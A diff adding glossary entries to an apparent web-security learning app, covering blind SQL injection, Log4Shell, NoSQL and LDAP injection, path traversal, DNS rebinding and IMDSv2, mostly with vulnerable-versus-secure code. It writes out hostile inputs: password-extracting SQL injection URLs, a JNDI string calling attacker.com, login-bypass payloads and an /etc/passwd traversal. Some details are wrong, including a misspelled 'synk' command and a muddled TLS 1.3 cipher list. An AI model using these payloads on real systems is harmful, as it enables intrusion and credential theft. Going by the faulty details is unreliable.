+      "techContext": "SQLMap's `--technique=B` flag for boolean-based blind and `--technique=T` for time-based blind extraction can recover an entire database schema from a vulnerable endpoint that returns no data, given enough requests.",
+      "exampleSentence": "Even though the search page never displayed SQL errors or result counts, the attacker extracted the full admin credentials table in four hours using boolean-based blind SQL injection automated with SQLMap.",
+      "codeExample": {
+        "language": "sql",
+        "code": "-- Boolean-based blind: extract username length\n-- Page returns normal if condition is TRUE, empty if FALSE\n\n-- Is the admin username 5 characters long?\nhttps://site.com/search?q=x' AND (SELECT LEN(username)\n    FROM users WHERE is_admin=1)=5--\n\n-- Time-based blind: extract first character of password\n-- 5-second delay if first password character is 'p'\nhttps://site.com/search?q=x' AND IF(\n    (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='p',\n    SLEEP(5), 0\n)--\n\n-- FIX: parameterized queries prevent all blind injection variants"
+      },
+      "etymology": "\"Blind\" modifies SQL injection analogously to \"blind\" in medical trials or \"blind\" in \"blind spot\" — the attacker operates without direct visibility of query results; the technique was documented extensively in early 2000s security research by attackers and tool developers like sqlninja and SQLMap.",
+      "unlockLevel": 4,
+      "tags": ["web-security", "injection", "database"],
+      "category": "vulnerabilities"
+    },
+    {
+      "id": "web-adv-0230-0000-0000-0000-000000000023",
+      "word": "IMDSv2",
+      "pronunciation": "IM-dee-es-VEE-two",
+      "partOfSpeech": "noun",
+      "shortDefinition": "AWS Instance Metadata Service v2; session-oriented protocol that blocks SSRF access to cloud credential endpoints.",
+      "simpleDefinition": "IMDSv2 is the AWS security upgrade for the EC2 metadata service. IMDSv1 allowed any code running on the instance — including SSRF-redirected requests — to retrieve IAM credentials with a single GET. IMDSv2 requires a PUT request with a session-TTL header first, and only then accepts credential requests using the returned token. Simple HTTP clients used in SSRF attacks cannot complete the PUT step.",
+      "longDefinition": "The AWS Instance Metadata Service (IMDS) is a link-local HTTP endpoint at 169.254.169.254 accessible only from within an EC2 instance, providing instance ID, IAM role credentials, and configuration data. IMDSv1 (the legacy default) requires no authentication and responds to any GET request from the instance — including those forwarded via SSRF vulnerabilities in applications running on that instance. The Capital One 2019 breach exploited exactly this: a WAF running on EC2 was vulnerable to SSRF, allowing an attacker to retrieve temporary IAM credentials from the metadata endpoint and then use them to exfiltrate S3 data. IMDSv2 (launched November 2019) addresses this by requiring a session-oriented token: the client must first send a `PUT /latest/api/token` request with an `X-aws-ec2-metadata-token-ttl-seconds` header, and the metadata service returns a session token; subsequent requests must include `X-aws-ec2-metadata-token: <token>`. Standard HTTP clients used in SSRF attacks typically support only GET/POST and do not follow PUT redirects, breaking the credential-theft chain. IMDSv2 can be enforced at the instance level (`HttpTokens: required` in instance metadata options) and at the AWS account level via an SCP (`ec2:ModifyInstanceMetadataOptions` restriction). AWS recommends setting `HttpTokens: required` on all new instances and disabling IMDSv1 organization-wide.",
+      "connector": "IMDSv2 is like replacing a building's master-key box (where anyone inside could grab a key) with a two-step authentication kiosk — you first have to prove you're supposed to be there by completing a specific challenge before the key is dispensed, which automated port-scanning tools can't do.",
+      "techContext": "To enforce IMDSv2 for all EC2 instances in an AWS account, attach an SCP that denies `ec2:RunInstances` unless the condition `ec2:MetadataHttpTokens` equals `required`, preventing any new instance from launching without IMDSv2.",
+      "exampleSentence": "After the Capital One breach, AWS recommended all customers enforce IMDSv2 by setting `HttpTokens: required` on every instance, eliminating the single-GET SSRF-to-credential-theft attack path.",
+      "codeExample": {
+        "language": "bash",
+        "code": "# IMDSv2: two-step token-based credential retrieval\n# Step 1 — acquire session token via PUT (standard SSRF clients cannot do this)\nTOKEN=$(curl -s -X PUT \\\n  -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\" \\\n  http://169.254.169.254/latest/api/token)\n\n# Step 2 — use token to fetch credentials\ncurl -H \"X-aws-ec2-metadata-token: $TOKEN\" \\\n  http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\n# Enforce IMDSv2 on an existing instance (AWS CLI)\naws ec2 modify-instance-metadata-options \\\n  --instance-id i-1234567890abcdef0 \\\n  --http-tokens required \\\n  --http-endpoint enabled"
+      },
+      "etymology": "IMDS is an AWS acronym for Instance Metadata Service; v2 designates the second, session-oriented version launched in 2019 specifically in response to SSRF attacks exploiting IMDSv1 in cloud deployments.",
+      "unlockLevel": 4,
+      "tags": ["web-security", "cloud", "ssrf", "aws"],
+      "category": "defenses"
+    },
+    {
+      "id": "web-adv-0240-0000-0000-0000-000000000024",
+      "word": "DNS rebinding",
+      "pronunciation": "DEE-en-ES REE-byn-ding",
+      "partOfSpeech": "noun",
+      "shortDefinition": "Attack that changes a DNS record mid-request to bypass IP-based SSRF allowlists after the hostname has been validated.",
+      "simpleDefinition": "DNS rebinding defeats SSRF defenses that validate hostnames without re-checking the resolved IP at connection time. The attacker registers a domain and serves a DNS record that first resolves to a safe external IP (passing validation), then rapidly changes (rebinds) to an internal IP before the actual HTTP connection is made. The server dials the internal IP while still trusting the externally valid hostname.",
+      "longDefinition": "DNS rebinding is an attack technique that exploits the time gap between DNS hostname validation and TCP connection establishment in server-side request code. A server implementing SSRF defense validates the target hostname (confirming it resolves to a safe external IP), then opens an HTTP connection — often milliseconds later. An attacker who controls the DNS record for a domain can serve an extremely short TTL (0–1 second), respond to the validation lookup with a safe IP that passes allowlist checks, and then switch the DNS record to a private IP (10.x.x.x, 192.168.x.x, 169.254.x.x) before the actual connection is made. The server's HTTP client resolves the hostname again (because the TTL expired) and connects to the internal IP, bypassing the IP-based blocklist. DNS rebinding also enables browser-based attacks: malicious scripts in a page can use the same technique to make the browser — which enforces the same-origin policy based on the hostname — believe it is accessing the malicious origin's own server while actually talking to internal services at 127.0.0.1 or LAN addresses. The correct defense is to resolve the hostname once, validate the resulting IP, and then pass the resolved IP (not the hostname) to the HTTP client — or use a network-level egress firewall that blocks RFC1918 addresses.",
+      "connector": "DNS rebinding is like a shape-shifting passport check: the passport reads \"visiting from France\" when the border agent looks, but by the time the visitor reaches the secure area, the passport has quietly changed to say \"internal employee\" — the check and the entry used different versions of the credential.",
+      "techContext": "The correct defense against DNS rebinding in SSRF contexts is \"pre-resolve and pin\": resolve the hostname to an IP, validate the IP against the blocklist, then connect directly to that IP with the `Host` header set correctly, bypassing any further DNS resolution.",
+      "exampleSentence": "The attacker bypassed the SSRF allowlist — which rejected RFC1918 addresses — by registering a domain with a 1-second TTL that initially resolved to 93.184.216.34 (passing validation) and then immediately rebinding to 192.168.1.1, reaching the internal admin interface.",
+      "codeExample": {
+        "language": "python",
+        "code": "import socket, ipaddress, urllib.parse, urllib.request\n\nBLOCKED_NETS = [\n    ipaddress.ip_network(\"10.0.0.0/8\"),\n    ipaddress.ip_network(\"172.16.0.0/12\"),\n    ipaddress.ip_network(\"192.168.0.0/16\"),\n    ipaddress.ip_network(\"169.254.0.0/16\"),\n    ipaddress.ip_network(\"127.0.0.0/8\"),\n]\n\ndef safe_fetch(url: str) -> bytes:\n    host = urllib.parse.urlparse(url).hostname\n    # Resolve once, validate, then connect directly to IP\n    resolved_ip = socket.getaddrinfo(host, 443)[0][4][0]\n    ip = ipaddress.ip_address(resolved_ip)\n    if any(ip in net for net in BLOCKED_NETS):\n        raise ValueError(f\"Blocked IP: {resolved_ip}\")\n    # Connect to the pinned IP directly — no further DNS resolution\n    safe_url = url.replace(host, resolved_ip)\n    return urllib.request.urlopen(safe_url).read()"
+      },
+      "etymology": "\"DNS rebinding\" was named by researchers Dan Kaminsky and Martin Johns in mid-2000s papers on browser security; the attack concept predates the name, appearing in 1990s papers on IP-based trust and the same-origin policy.",
+      "unlockLevel": 4,
+      "tags": ["web-security", "ssrf", "dns", "network"],
+      "category": "vulnerabilities"
+    },
+    {
+      "id": "web-adv-0250-0000-0000-0000-000000000025",
+      "word": "NoSQL injection",
+      "pronunciation": "NO-es-KYOO-EL in-JEK-shun",
+      "partOfSpeech": "noun",
+      "shortDefinition": "Attacker injects MongoDB operator objects (e.g., $ne, $gt) to bypass authentication or exfiltrate records.",
+      "simpleDefinition": "NoSQL injection exploits applications that pass user-controlled JSON directly to a document database query engine. MongoDB, in particular, interprets operator keys like `$ne` (not-equal) and `$gt` (greater-than) as query operators rather than literal values. Supplying `{\"$ne\": null}` where a password is expected makes every query return true regardless of the actual password.",
+      "longDefinition": "NoSQL injection arises when a web application accepts user-supplied JSON (or other structured input) and incorporates it into a database query without type-checking or stripping of operator keys. MongoDB's query language allows structured operator objects — `{\"$ne\": null}`, `{\"$gt\": \"\"}`, `{\"$regex\": \".*\"}` — to modify query semantics. If an application passes user input directly into a MongoDB find or findOne call, an attacker can inject operator objects that alter the query's logic. Authentication bypass: `{\"username\": \"admin\", \"password\": {\"$ne\": null}}` matches any admin user whose password is not null — i.e., any admin — regardless of what the attacker actually sends as a password. Data enumeration: `{\"$regex\": \"^a\"}` on a username field returns users whose names begin with 'a', allowing character-by-character extraction. This mirrors blind SQL injection in structure. NoSQL injection also appears in operator injection via HTTP parameters in web frameworks that auto-parse `?password[$ne]=x` into the object `{password: {$ne: \"x\"}}`. Defense: validate that user-supplied values are of the expected type (string, not object) before incorporating them into queries; use schema validation (Mongoose, class-validator) to reject unexpected operator fields; or construct queries with explicit primitive values rather than spreading user objects.",
+      "connector": "NoSQL injection is like asking a vending machine for a snack by inserting a note that says \"dispense all items\" instead of typing a product code — MongoDB interprets your structured input as a command rather than a data value if you use the right syntax.",
+      "techContext": "Express.js applications that accept `Content-Type: application/json` bodies and pass `req.body.password` directly to a Mongoose query are vulnerable to `{\"$ne\": null}` authentication bypass if `req.body.password` is not explicitly coerced to a string.",
+      "exampleSentence": "The attacker bypassed login by submitting `{\"username\": \"admin\", \"password\": {\"$ne\": \"\"}}` to the JSON login endpoint, which matched the admin user because any non-empty password is not-equal to an empty string.",
+      "codeExample": {
+        "language": "javascript",
+        "code": "// VULNERABLE — passes req.body directly to MongoDB query\napp.post('/login', async (req, res) => {\n  const user = await User.findOne({\n    username: req.body.username,\n    password: req.body.password,  // if body.password = {$ne:null}, auth bypassed\n  });\n  if (user) res.json({ token: generateJWT(user) });\n});\n\n// SECURE — coerce to string and validate type\napp.post('/login', async (req, res) => {\n  const username = String(req.body.username);\n  const password = String(req.body.password);  // rejects {$ne:null}\n  if (typeof username !== 'string' || typeof password !== 'string')\n    return res.status(400).json({ error: 'Invalid input' });\n  const user = await User.findOne({ username, password });\n  if (user) res.json({ token: generateJWT(user) });\n});"
+      },
+      "etymology": "\"NoSQL injection\" was named by analogy to SQL injection when MongoDB and CouchDB became widely used in the late 2000s; the first systematic exploitation techniques using MongoDB operator injection were documented circa 2010–2012.",
+      "unlockLevel": 4,
+      "tags": ["web-security", "injection", "database", "nosql"],
+      "category": "vulnerabilities"
+    },
+    {
+      "id": "web-adv-0260-0000-0000-0000-000000000026",
+      "word": "Log4Shell",
+      "pronunciation": "LOG-for-SHELL",
+      "partOfSpeech": "noun",
+      "shortDefinition": "CVE-2021-44228; Log4j JNDI lookup in log messages led to unauthenticated RCE on any system logging user input.",
+      "simpleDefinition": "Log4Shell is the most severe vulnerability of 2021: Log4j 2.x (a near-ubiquitous Java logging library) evaluated `${jndi:ldap://attacker.com/payload}` sequences embedded in log messages. Any application that logged a user-controlled string — a User-Agent header, a username, a search query — would initiate an outbound JNDI connection and execute attacker-supplied Java code.",
+      "longDefinition": "CVE-2021-44228 (Log4Shell) was disclosed on December 9, 2021, and immediately rated CVSS 10.0 — the maximum score. The vulnerability exists in Apache Log4j 2 (versions 2.0-beta9 through 2.14.1), a logging library present in millions of Java applications worldwide, including enterprise products from VMware, Cisco, IBM, Oracle, and Amazon. The attack vector: Log4j's \"message lookup substitution\" feature evaluates special `${...}` expressions in logged strings, including `${jndi:ldap://...}` which initiates a Java Naming and Directory Interface (JNDI) lookup to an attacker-controlled LDAP server. The LDAP server responds with a reference to a remote Java class, which Log4j deserializes and instantiates — executing arbitrary code with the privileges of the JVM. Because logging is pervasive (User-Agent, login fields, API parameters, hostnames), any application logging any user-controlled input was potentially vulnerable. Exploitation required zero authentication and zero user interaction — a single HTTP request was sufficient. The full impact: the attacker controlled the payload URL, the payload class, and received a callback from the vulnerable server, confirming exploitation. The fix (Log4j 2.17.0) disabled JNDI lookups entirely. The incident became a defining case study for supply-chain risk: the vulnerable library was a transitive dependency in most affected systems, and many organizations did not know they were running it until the patch was mandated.",
+      "connector": "Log4Shell is like discovering that the world's most widely used mailbox has a feature that, if you address a letter with a special code, causes the mailbox to call the attacker's phone and give them the house keys — and millions of buildings have been using the mailbox for years without knowing about that feature.",
+      "techContext": "A minimal proof-of-concept for Log4Shell involves sending `User-Agent: ${jndi:ldap://attacker.com:1389/exploit}` in any HTTP request to a Log4j 2.x application — if the server initiates an LDAP connection, the application is vulnerable.",
+      "exampleSentence": "Security teams worldwide spent the weeks after Log4Shell disclosure scanning their entire software inventory using SCA tools to identify any transitive dependency on a vulnerable Log4j version, patching across thousands of services.",
+      "codeExample": {
+        "language": "bash",
+        "code": "# Detect Log4j in a Java application's classpath\n# Using syft SBOM tool\nsynk test --all-projects | grep -i log4j\n\n# Or scan JAR files for embedded Log4j\nfind /opt/app -name '*.jar' -exec \\\n  unzip -p {} META-INF/MANIFEST.MF 2>/dev/null \\; | \\\n  grep -l 'log4j'\n\n# Patching: upgrade to Log4j 2.17.0+\n# In Maven pom.xml:\n# <dependency>\n#   <groupId>org.apache.logging.log4j</groupId>\n#   <artifactId>log4j-core</artifactId>\n#   <version>2.17.1</version>\n# </dependency>"
+      },
+      "etymology": "Log4Shell combines \"Log4j\" (the vulnerable library) and \"Shell\" (colloquial for remote shell / code execution); the name was coined in the security community within hours of CVE-2021-44228's public disclosure on December 9, 2021.",
+      "unlockLevel": 4,
+      "tags": ["web-security", "injection", "supply-chain", "java"],
+      "category": "vulnerabilities"
+    },
+    {
+      "id": "web-adv-0270-0000-0000-0000-000000000027",
+      "word": "AES-GCM",
+      "pronunciation": "AY-ee-es JEE-see-EM",
+      "partOfSpeech": "noun",
+      "shortDefinition": "AES in Galois/Counter Mode; an AEAD cipher providing authenticated encryption; standard for TLS 1.3 and at-rest encryption.",
+      "simpleDefinition": "AES-GCM combines AES in Counter Mode (for encryption) with a Galois field MAC (for authentication) into a single AEAD construction. It encrypts and produces a 128-bit authentication tag in one pass. Hardware-accelerated via AES-NI on virtually every modern CPU, it is one of only three cipher suites permitted in TLS 1.3 and the standard choice for encrypting data at rest.",
+      "longDefinition": "AES-GCM (AES in Galois/Counter Mode) is the most widely deployed AEAD cipher suite in production systems. It combines two components: AES-CTR (Counter Mode) for encryption — the plaintext is XOR'd with a keystream generated by encrypting a counter with AES, producing ciphertext that is the same length as the plaintext with no padding required — and GHASH (Galois Hash), a polynomial authentication function evaluated over the ciphertext and associated data to produce a 128-bit authentication tag. Both components execute in one pass, and both leverage AES-NI hardware instructions available in virtually all modern x86 and ARM CPUs, enabling throughput exceeding 10 GB/s on commodity hardware. AES-GCM is one of three mandatory cipher suites in TLS 1.3 (alongside AES-128-GCM and ChaCha20-Poly1305) and is the standard for at-rest encryption in cloud services (AWS SSE-S3, Azure Storage Service Encryption, Google Cloud KMS envelope encryption all use AES-256-GCM). Critical implementation requirement: the 96-bit nonce must be unique for every encryption operation with the same key. AES-GCM nonce reuse is catastrophic — encrypting two different plaintexts with the same (key, nonce) pair allows an attacker to recover both plaintexts and forge arbitrary authentication tags. Mitigation: use a deterministic counter nonce, or generate a cryptographically random 96-bit nonce per message (the probability of collision across 2^32 messages is negligible at 96 bits).",
+      "connector": "AES-GCM is the cryptographic equivalent of a tamper-evident sealed container with an internal camera: it encrypts the contents (CTR mode) and simultaneously photographs the interior to produce an unforgeable seal (GHASH tag) — if either the contents or the seal is touched, the mismatch is immediately apparent upon opening.",
+      "techContext": "When using AES-256-GCM with a randomly generated nonce, the ciphertext output consists of: 12-byte nonce || encrypted payload || 16-byte authentication tag — always store and transmit all three together; the nonce does not need to be secret.",
+      "exampleSentence": "The database encryption-at-rest migration to AES-256-GCM reduced the risk surface to key management alone, since GCM's authentication tag ensures that any offline modification of an encrypted record will be detected on decryption.",
+      "codeExample": {
+        "language": "python",
+        "code": "from cryptography.hazmat.primitives.ciphers.aead import AESGCM\nimport os\n\n# AES-256-GCM encryption\nkey = os.urandom(32)           # 256-bit key — store in KMS, never hardcode\ncipher = AESGCM(key)\n\ndef encrypt(plaintext: bytes, context: bytes = b\"\") -> bytes:\n    nonce = os.urandom(12)     # unique 96-bit nonce per message\n    ct = cipher.encrypt(nonce, plaintext, context)  # context = AAD\n    return nonce + ct          # prepend nonce to ciphertext for storage\n\ndef decrypt(blob: bytes, context: bytes = b\"\") -> bytes:\n    nonce, ct = blob[:12], blob[12:]\n    return cipher.decrypt(nonce, ct, context)  # raises if tag invalid"
+      },
+      "etymology": "GCM (Galois/Counter Mode) was specified by David McGrew and John Viega in NIST SP 800-38D (2007); Galois field refers to the finite-field arithmetic used in the GHASH authentication function, named after French mathematician Évariste Galois.",
+      "unlockLevel": 4,
+      "tags": ["web-security", "cryptography", "defenses"],
+      "category": "cryptography"
+    },
+    {
+      "id": "web-adv-0280-0000-0000-0000-000000000028",
+      "word": "privilege escalation",
+      "pronunciation": "PRIV-ih-lij ES-kuh-LAY-shun",
+      "partOfSpeech": "noun",
+      "shortDefinition": "Attacker gains higher access than authorized — vertical (user to admin) or horizontal (one user's data to another's).",
+      "simpleDefinition": "Privilege escalation is gaining more access than you were granted. Vertical escalation moves up the privilege ladder — a regular user accesses admin features. Horizontal escalation moves sideways — a user accesses another user's data at the same privilege level. Both are broken access control; the difference is direction, not root cause.",
+      "longDefinition": "Privilege escalation describes any exploitation of access-control weaknesses that results in a principal gaining capabilities beyond what was authorized. The two axes correspond to the two dimensions of access control: vertical privilege escalation occurs when a lower-privileged principal gains the capabilities of a higher-privileged role — a standard user accessing admin functionality (BFLA), a guest account reading staff-only records, or an application user executing OS commands as root. Horizontal privilege escalation occurs when a principal accesses resources owned by a peer at the same privilege level — reading another user's private messages, viewing another customer's invoices, or modifying another account holder's profile (IDOR/BOLA). Both forms share a root cause: authorization checks are absent, incomplete, or bypassable. In web applications, privilege escalation vulnerabilities manifest across multiple layers: HTTP endpoint RBAC checks, object-level ownership verification, field-level write permissions (mass assignment), and API key scope enforcement. In operating systems, privilege escalation exploits SUID/GUID binaries, weak sudo rules, unquoted service paths, and kernel vulnerabilities. Mitigations span the full defense-in-depth stack: enforce least-privilege IAM roles, verify ownership at every object retrieval, use parameterized permission checks at the function layer, and conduct regular privilege escalation testing as part of penetration test scope.",
+      "connector": "Privilege escalation is like a hotel guest using the lobby printer to print a master key card — the printer should only print documents, but a combination of weak access controls let the guest craft a credential that unlocks rooms they were never authorized to enter.",
+      "techContext": "Post-exploitation privilege escalation on Linux systems is commonly tested with tools like LinPEAS or GTFOBins, which enumerate SUID binaries, writable cron jobs, and sudo rules that allow escalation from a compromised web-server user to root.",
+      "exampleSentence": "The penetration tester demonstrated vertical privilege escalation by discovering that changing the `role` parameter in the JWT from `user` to `admin` — without re-signing — was accepted by the development server that had disabled signature verification for testing.",
+      "codeExample": {
+        "language": "python",
+        "code": "# VULNERABLE — role read from untrusted JWT claim without server-side check\n@app.get(\"/admin/dashboard\")\ndef admin_dashboard(claims=Depends(decode_jwt)):\n    if claims[\"role\"] != \"admin\":   # role comes from the token, not the DB\n        raise HTTPException(403)\n    return admin_data()\n\n# SECURE — re-fetch role from authoritative source (database)\n@app.get(\"/admin/dashboard\")\ndef admin_dashboard(user_id=Depends(get_user_id_from_jwt)):\n    user = db.get(User, user_id)\n    if not user or user.role != \"admin\":  # role from DB, not client-controlled\n        raise HTTPException(403)\n    return admin_data()"
+      },
+      "etymology": "\"Privilege escalation\" comes from operating-systems security literature of the 1970s–80s (Bell-LaPadula model, Unix security); it became a central term in penetration testing methodology through the PTES and OWASP testing guides in the 2000s.",
+      "unlockLevel": 4,
+      "tags": ["web-security", "authorization", "post-exploitation"],
+      "category": "vulnerabilities"
+    },
+    {
+      "id": "web-adv-0290-0000-0000-0000-000000000029",
+      "word": "path traversal",
+      "pronunciation": "PATH TRAV-ur-sul",
+      "partOfSpeech": "noun",
+      "shortDefinition": "User-supplied file path containing ../ sequences escapes the intended directory and accesses arbitrary files.",
+      "simpleDefinition": "Path traversal (directory traversal) lets an attacker read or write files outside the intended directory by including `../` sequences in a user-supplied file path parameter. Requesting `/files/../../etc/passwd` causes the server to step up two directories from the intended `files/` directory and read the system password file. URL-encoded variants (`%2e%2e%2f`) bypass naive string filters.",
+      "longDefinition": "Path traversal (also called directory traversal, dot-dot-slash, or the ../ attack) is an injection vulnerability in file-serving code that passes user-supplied path components directly to filesystem operations. When a web application accepts a file identifier like `?file=report.pdf` and opens `BASEPATH + file`, an attacker submitting `?file=../../etc/passwd` causes the OS to resolve the path upward through the directory hierarchy, escaping the intended base directory. The `../` sequences are the attack vector, often encoded to bypass filters: `%2e%2e%2f` (URL-encoded), `..%2f`, `%2e%2e/`, `..\\` (Windows), and Unicode normalization variants. Impacts range from arbitrary file read (exfiltrating source code, configuration files, private keys, `/etc/shadow`) to arbitrary file write (overwriting configuration files, uploading webshells, modifying cron jobs). The vulnerability appears in file download endpoints, log viewers, document management systems, template loaders, and any code that maps user input to a filesystem path. Defenses: canonicalize the resolved path with `os.path.realpath()` or the equivalent and verify it starts with the intended base directory before opening; use language-specific path APIs that sandbox operations (Java's `java.nio.file.Path.resolve().normalize()`); avoid exposing raw file paths in user-facing parameters — use opaque identifiers mapped server-side; apply OS-level sandboxing (chroot, seccomp) to limit the blast radius.",
+      "connector": "Path traversal is like giving a library visitor a room number and they walk backwards through the corridors — each `../` step takes them one room back until they're in the restricted archives the library never meant them to reach.",
+      "techContext": "After canonicalizing the path, verify it starts with the expected base directory: `assert resolved.startswith(BASE_DIR)` — this single check prevents all `../` variants including URL-encoded and Unicode-normalized forms.",
+      "exampleSentence": "The file-download endpoint was vulnerable to path traversal: requesting `/download?file=../../etc/nginx/nginx.conf` returned the server's Nginx configuration, revealing internal backend hostnames and basic-auth credentials.",
+      "codeExample": {
+        "language": "python",
+        "code": "import os\n\nBASE_DIR = \"/var/app/files\"\n\n# VULNERABLE — joins user path without canonicalization\ndef download_file(filename: str) -> bytes:\n    path = os.path.join(BASE_DIR, filename)\n    with open(path, 'rb') as f:  # ../../etc/passwd escapes BASE_DIR\n        return f.read()\n\n# SECURE — canonicalize and verify confinement\ndef download_file(filename: str) -> bytes:\n    # realpath resolves symlinks and ../ before the check\n    resolved = os.path.realpath(os.path.join(BASE_DIR, filename))\n    if not resolved.startswith(BASE_DIR + os.sep):\n        raise PermissionError(\"Path traversal detected\")\n    with open(resolved, 'rb') as f:\n        return f.read()"
+      },
+      "etymology": "\"Directory traversal\" is the original term from Unix security literature; \"path traversal\" is the more general modern term used by OWASP; the `../` metaphor reflects traversing upward through the directory tree hierarchy.",
+      "unlockLevel": 4,
+      "tags": ["web-security", "injection", "filesystem"],
+      "category": "vulnerabilities"
+    },
+    {
+      "id": "web-adv-0300-0000-0000-0000-000000000030",
+      "word": "LDAP injection",
+      "pronunciation": "EL-dap in-JEK-shun",
+      "partOfSpeech": "noun",
+      "shortDefinition": "Unescaped user input embedded in LDAP filter strings, enabling authentication bypass or directory enumeration.",
+      "simpleDefinition": "LDAP injection occurs when user input is concatenated into an LDAP filter string without escaping special characters. In LDAP filter syntax, `*` is a wildcard, `(` and `)` delimit filter groups, and `|` means OR. An attacker who can inject `*` into a password field can authenticate with any username; injecting `)(uid=*)` can enumerate the entire directory.",
+      "longDefinition": "LDAP (Lightweight Directory Access Protocol) injection is the directory-service analog of SQL injection. Web applications that authenticate users against Active Directory or an LDAP directory construct filter strings programmatically: `(&(uid=<user>)(password=<pass>))`. When user input is concatenated directly without escaping LDAP special characters, an attacker can alter the filter structure. LDAP special characters include: `*` (wildcard), `(`, `)` (group delimiters), `|` (OR operator), `&` (AND operator), `!` (NOT operator), and `\\` (escape prefix). Authentication bypass: submitting `*` as the username and `*)(&(objectclass=*` as the password transforms the filter to `(&(uid=*)(password=*)(&(objectclass=*))...)` — the first sub-filter `(uid=*)` matches every user and `(password=*)` matches any non-null password, effectively bypassing authentication. Blind enumeration: submitting `admin)(uid=*)` with a crafted password can return true for any user if the injected filter matches any directory entry. LDAP injection also enables directory data extraction by injecting wildcard-based filter conditions and inferring the existence of attributes from authentication responses. Defenses: use the LDAP framework's parameterized filter APIs if available; otherwise apply strict escaping of LDAP special characters in all user-supplied values according to RFC 4515; validate input against an allowlist of expected characters; prefer modern LDAP libraries that offer safe filter constructors.",
+      "connector": "LDAP injection is like a receptionist who looks up visitors in a book using whatever name you write on the form — if you write `Smith OR anyone*`, the receptionist's lookup matches everyone in the book, not just the person you're claiming to be.",
+      "techContext": "Active Directory authentication flows are particularly common LDAP injection targets in enterprise web applications; testing with `admin*` as a username confirms wildcard-based bypass when the application returns a successful authentication response.",
+      "exampleSentence": "The attacker bypassed the Active Directory authentication by submitting `*` as the username and `*)(&(uid=*)` as the password, causing the LDAP filter to match all users and granting access to the admin account.",
+      "codeExample": {
+        "language": "python",
+        "code": "from ldap3 import Server, Connection, SIMPLE, SUBTREE\nimport re\n\ndef escape_ldap(value: str) -> str:\n    \"\"\"Escape LDAP special characters per RFC 4515.\"\"\"\n    value = value.replace('\\\\', '\\\\5c')\n    for char, escaped in [('*','\\\\2a'), ('(','\\\\28'), (')','\\\\29'),\n                           ('\\x00','\\\\00'), ('/','\\\\2f')]:\n        value = value.replace(char, escaped)\n    return value\n\ndef authenticate_ldap(username: str, password: str) -> bool:\n    # Escape ALL user inputs before embedding in filter\n    safe_user = escape_ldap(username)\n    conn = Connection(\n        Server('ldap://corp.example.com'),\n        user=f'uid={safe_user},ou=users,dc=corp,dc=example,dc=com',\n        password=password,\n        authentication=SIMPLE,\n    )\n    return conn.bind()"
+      },
+      "etymology": "LDAP was standardized in RFC 1487 (1993) and RFC 4510 (2006); LDAP injection was described in security literature from 2003 onward, following the model of SQL injection; RFC 4515 defines the required escaping rules that prevent injection.",
+      "unlockLevel": 4,
+      "tags": ["web-security", "injection", "directory-services"],
+      "category": "vulnerabilities"
+    }
+  ]
+}
